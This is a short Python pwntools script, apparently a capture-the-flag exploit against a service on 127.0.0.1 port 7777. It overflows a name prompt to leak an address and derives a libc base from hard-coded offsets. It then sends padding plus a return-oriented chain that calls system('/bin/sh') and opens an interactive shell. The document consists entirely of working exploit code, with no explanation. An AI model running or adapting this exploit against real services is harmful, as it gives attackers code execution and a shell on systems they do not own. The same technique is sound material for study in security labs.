from pwn import *
import binascii

p = remote("127.0.0.1", 7777)
p.recvuntil("Enter name: ")
p.send("A" * 257)
tmp = p.recvuntil("!")

addr = tmp[265:]
addr = addr[:6].ljust(8, "\x00")
addr = u64(addr)
addr -= 0x41 # hex value of 'A'

libc_base = addr - 0x5c8000
log.info("address: {}".format(hex(addr)))
log.info("libc base: {}".format(hex(libc_base)))

pop_rdi = libc_base + 0x22482
bin_sh = libc_base + 0x163b00
system_addr = libc_base + 0x41570

rop_chain = p64(pop_rdi)
rop_chain += p64(bin_sh)
rop_chain += p64(system_addr)

pad = "A" * 152
p.sendline(pad + rop_chain)

p.interactive()
